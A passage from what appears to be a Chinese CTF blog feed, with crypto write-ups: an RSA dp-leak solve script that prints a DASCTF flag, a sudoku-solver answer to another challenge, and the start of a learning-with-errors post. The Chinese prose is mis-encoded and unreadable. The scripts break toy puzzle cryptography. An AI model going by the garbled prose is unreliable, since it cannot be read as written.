6909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line"></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">x = <span class="number">2019</span>*p**<span class="number">2</span> + <span class="number">2020</span>*p**<span class="number">3</span> + <span class="number">2021</span>*p**<span class="number">4</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(g, x, y)</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&quot;c1 = &quot;</span> + <span class="built_in">str</span>(c1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dp = 379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c1 = 78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059</span></span><br></pre></td></tr></table></figure><p>y-1å…‰æ»‘ï¼Œå¯ç”¨ç¦»æ•£å¯¹æ•°è§£å‡ºxï¼Œç„¶åZ3 Solverè§£å‡ºpï¼Œæ¥ç€å°±æ˜¯å·²çŸ¥dpï¼Œpçš„æ¨¡å‹ï¼Œå¾ˆå®¹æ˜“å°±èƒ½åšå‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">y = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">c1 = <span class="number">78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">p = <span class="number">12131601165788024635030034921084070470053842112984866821070395281728468805072716002494427632757418621194662541766157553264889658892783635499016425528807741</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425</span></span><br><span class="line">dp = <span class="number">379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473</span></span><br><span class="line">b = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">mp1 = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp1, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">y = <span class="built_in">pow</span>(x * mp * (gmpy2.invert(e, p)), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">mp1 = mp1 + y</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(mp1))</span><br><span class="line"><span class="comment">#b&#x27;DASCTF&#123;98d923h4344e3bf72f8775xy65tvftv5&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="å¯†ç äººé›†åˆ"><a href="#å¯†ç äººé›†åˆ" class="headerlink" title="å¯†ç äººé›†åˆ"></a>å¯†ç äººé›†åˆ</h1><p>yysyï¼Œå‰ä¸€éƒ¨åˆ†ç»™æˆ‘çœ‹æ¹¿äº†ï¼Œå¯†ç äººå¹³æ—¶è¿˜æŒºå­¤ç‹¬çš„ã€‚</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2FJ5@Z%7BW%5DZ91X1FN6IO2CV.png" alt="img"></p><p>æ³ªç›®</p><p>å°±åšé¢˜è€Œè¨€ä¸ç®—å›°éš¾ï¼Œåœ¨ç½‘ä¸ŠæŠ„ä¸ªæ•°ç‹¬è„šæœ¬å°±èƒ½å‡ºäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line">sys.setrecursionlimit(<span class="number">100000</span>) <span class="comment"># å‘ç°pythoné»˜è®¤çš„é€’å½’æ·±åº¦æ˜¯å¾ˆæœ‰é™çš„</span></span><br><span class="line">                              <span class="comment">#ï¼ˆé»˜è®¤æ˜¯1000ï¼‰ï¼Œå› æ­¤å½“é€’å½’æ·±åº¦è¶…è¿‡999çš„</span></span><br><span class="line">                              <span class="comment"># æ ·å­ï¼Œå°±ä¼šå¼•å‘è¿™æ ·çš„ä¸€ä¸ªå¼‚å¸¸ã€‚</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_next</span>(<span class="params">m, x, y</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; åŠŸèƒ½ï¼šè·å¾—ä¸‹ä¸€ä¸ªç©ºç™½æ ¼åœ¨æ•°ç‹¬ä¸­çš„åæ ‡ã€‚       </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> next_y <span class="keyword">in</span> <span class="built_in">range</span>(y+<span class="number">1</span>, <span class="number">9</span>):  <span class="comment"># ä¸‹ä¸€ä¸ªç©ºç™½æ ¼å’Œå½“å‰æ ¼åœ¨ä¸€è¡Œçš„æƒ…å†µ</span></span><br><span class="line">        <span class="keyword">if</span> m[x][next_y] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> x, next_y</span><br><span class="line">    <span class="keyword">for</span> next_x <span class="keyword">in</span> <span class="built_in">range</span>(x+<span class="number">1</span>, <span class="number">9</span>):  <span class="comment"># ä¸‹ä¸€ä¸ªç©ºç™½æ ¼å’Œå½“å‰æ ¼ä¸åœ¨ä¸€è¡Œçš„æƒ…å†µ</span></span><br><span class="line">        <span class="keyword">for</span> next_y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> m[next_x][next_y] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> next_x, next_y</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span>               <span class="comment"># è‹¥ä¸å­˜åœ¨ä¸‹ä¸€ä¸ªç©ºç™½æ ¼ï¼Œåˆ™è¿”å› -1ï¼Œ-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">value</span>(<span class="params">m, x, y</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; åŠŸèƒ½ï¼šè¿”å›ç¬¦åˆ&quot;æ¯ä¸ªæ¨ªæ’å’Œç«–æ’ä»¥åŠ</span></span><br><span class="line"><span class="string">              ä¹å®«æ ¼å†…æ— ç›¸åŒæ•°å­—&quot;è¿™ä¸ªæ¡ä»¶çš„æœ‰æ•ˆå€¼ã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> </span><br><span class="line">    i, j = x//<span class="number">3</span>, y//<span class="number">3</span></span><br><span class="line">    grid = [m[i*<span class="number">3</span>+r][j*<span class="number">3</span>+c] <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    v = <span class="built_in">set</span>([x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>)]) - <span class="built_in">set</span>(grid) - <span class="built_in">set</span>(m[x]) - \</span><br><span class="line">        <span class="built_in">set</span>(<span class="built_in">list</span>(<span class="built_in">zip</span>(*m))[y])    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(v)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_pos</span>(<span class="params">m</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; åŠŸèƒ½ï¼šè¿”å›ç¬¬ä¸€ä¸ªç©ºç™½æ ¼çš„ä½ç½®åæ ‡&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> m[x][y] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> x, y</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">False</span>  <span class="comment"># è‹¥æ•°ç‹¬å·²å®Œæˆï¼Œåˆ™è¿”å› False, False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_sudoku</span>(<span class="params">m, x, y</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; åŠŸèƒ½ï¼šè¯•ç€å¡«å†™æ•°ç‹¬ &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> value(m, x, y):</span><br><span class="line">        m[x][y] = v</span><br><span class="line">        next_x, next_y = get_next(m, x, y)</span><br><span class="line">        <span class="keyword">if</span> next_y == -<span class="number">1</span>: <span class="comment"># å¦‚æœæ— ä¸‹ä¸€ä¸ªç©ºç™½æ ¼</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = try_sudoku(m, next_x, next_y) <span class="comment"># é€’å½’</span></span><br><span class="line">            <span class="keyword">if</span> end:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            m[x][y] = <span class="number">0</span> <span class="comment"># åœ¨é€’å½’çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ•°ç‹¬æ²¡æœ‰è§£å¼€ï¼Œ</span></span><br><span class="line">                        <span class="comment"># åˆ™å›æº¯åˆ°ä¸Šä¸€ä¸ªç©ºç™½æ ¼</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sudoku</span>(<span class="params">m</span>):</span>        </span><br><span class="line">    x, y = start_pos(m)</span><br><span class="line">    try_sudoku(m, x, y)</span><br><span class="line">    <span class="built_in">print</span>(m)     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    m = m = [</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    ]</span><br><span class="line">    sudoku(m)</span><br><span class="line">    a=[[<span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">6</span>], [<span class="number">6</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>], [<span class="number">7</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>], [<span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">3</span>], [<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>], [<span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">1</span>], [<span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>], [<span class="number">1</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, </span><br><span class="line"><span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>]]</span><br><span class="line">    my_dic= &#123;<span class="number">1</span>:<span class="string">&#x27;æˆ‘&#x27;</span>, <span class="number">2</span>:<span class="string">&#x27;è¦&#x27;</span>,<span class="number">3</span>:<span class="string">&#x27;æ‹¿&#x27;</span>,<span class="number">4</span>:<span class="string">&#x27;è¥¿&#x27;</span>,<span class="number">5</span>:<span class="string">&#x27;æ¹–&#x27;</span>,<span class="number">6</span>:<span class="string">&#x27;è®º&#x27;</span>,<span class="number">7</span>:<span class="string">&#x27;å‰‘&#x27;</span>,<span class="number">8</span>:<span class="string">&#x27;ç¬¬&#x27;</span>,<span class="number">9</span>:<span class="string">&#x27;ä¸€&#x27;</span>&#125;</span><br><span class="line">    re=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="built_in">print</span>(my_dic[a[i][j]],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;m = [</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0]</span></span><br><span class="line"><span class="string">    ]&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="éšä¾¿å†™ç‚¹"><a href="#éšä¾¿å†™ç‚¹" class="headerlink" title="éšä¾¿å†™ç‚¹"></a>éšä¾¿å†™ç‚¹</h1><p>ç»´çº³å‹æ ¹æ²¡çœ‹ã€‚ã€‚</p><p>curveé‚£é¢˜å‘ç°addï¼ˆï¼‰æ˜¯å¯é€†çš„ï¼Œä¸€å¼€å§‹ä¼°è®¡å’Œç¥¥äº‘æ¯é‚£é¢˜æœ‰ç‚¹ç±»ä¼¼ï¼Œä½†æ˜¯ä¸çŸ¥é“è¯¥æ€ä¹ˆè§£å‡ºeå•Šï¼ŒæŠ˜ç£¨ï¼Œåæ¥å‘ç°addï¼ˆGï¼‰çš„è§„å¾‹ï¼Œåªèƒ½çŸ¥é“e%4 = 1ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨ã€‚</p><p>nfsré‚£é¢˜bobæ‰¾äº†å‡ ä¸ªè„šæœ¬éƒ½æ²¡è·‘å‡ºæ¥ï¼Œå› ä¸ºè¿™æ¬¡maskæ˜¯64byteçš„ï¼Œåº”è¯¥æ˜¯è¦ç”¨å¿«é€Ÿç›¸å…³æ”»å‡»ï¼Ÿ</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;é¢˜ç›®è¿˜ä¸é”™ï¼Œéš¾åº¦æ¢¯åº¦æœ‰ç‚¹å¤§ï¼Œå‡ºäº†ä¸‰é“ï¼Œåé¢ä¸‰é“éš¾çš„éƒ½ä¸ä¼šåš&lt;/p&gt;
&lt;p&gt;é¢å‘WPå­¦ä¹ &lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="Pell Equation" scheme="http://sh1k4ku.github.io/tags/Pell-Equation/"/>
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
    <category term="ç¦»æ•£å¯¹æ•°" scheme="http://sh1k4ku.github.io/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/"/>
    
    <category term="DSA" scheme="http://sh1k4ku.github.io/tags/DSA/"/>
    
  </entry>
  
  <entry>
    <title>learning with errors</title>
    <link href="http://sh1k4ku.github.io/2021/11/09/2021/learning-with-errors/"/>
    <id>http://sh1k4ku.github.io/2021/11/09/2021/learning-with-errors/</id>
    <published>2021-11-09T04:11:41.000Z</published>
    <updated>2021-11-09T04:40:14.569Z</updated>
    
    <content type="html"><![CDATA[<p>appearCVP</p><span id="more"></span><script type="math/tex; mode=display">v = a*U+s\\å·²çŸ¥vï¼ŒUæ±‚aï¼Œsä½œä¸ºå™ªå£°å½±å“ç»“æœï¼Œé€šå¸¸æƒ…å†µä¸‹å¾ˆå°\\å¦‚æœæ²¡æœ‰sï¼Œåˆ™å¯ç›´æ¥ç”¨é«˜æ–¯æ¶ˆå…ƒæ³•æ±‚aã€‚\\å°†Uå½“æˆæ ¼ï¼Œvæ˜¯Uçš„çº¿æ€§ç»„åˆ\\åŸæœ¬våœ¨æ ¼ä¸Šï¼Œä½†åŠ å…¥äº†å™ªå£°ä½¿å¾—væœ‰äº›åç¦»\\è¦åšçš„å°±æ˜¯æ±‚vçš„æœ€è¿‘å‘é‡ï¼Œè§£å‡ºCVPï¼Œå†ç”¨é«˜æ–¯æ¶ˆå…ƒå°±å¯æ±‚å‡ºa</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,V</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_U</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_U1</span>():</span></span><br><span class="line">        A = Matrix(ZZ, n, n)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n):</span><br><span class="line">                <span class="keyword">if</span> i&lt;j:</span><br><span class="line">                    A[i,j] = random.randint(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">                <span class="keyword">if</span> i==j:</span><br><span class="line">                    A[i,j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> A</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_U2</span>():</span></span><br><span class="line">        A = Matrix(ZZ, n, n)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n):</span><br><span class="line">                <span class="keyword">if</span> i&gt;j:</span><br><span class="line">                    A[i,j] = random.randint(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">                <span class="keyword">if</span> i==j:</span><br><span class="line">                    A[i,j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> A</span><br><span class="line">    <span class="keyword">return</span> get_U1()*get_U2()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_public_key</span>():</span></span><br><span class="line">    U = get_random_U(<span class="number">9</span>)</span><br><span class="line">    V = matrix(V)</span><br><span class="line">    W = V*U</span><br><span class="line">    <span class="keyword">return</span> W</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 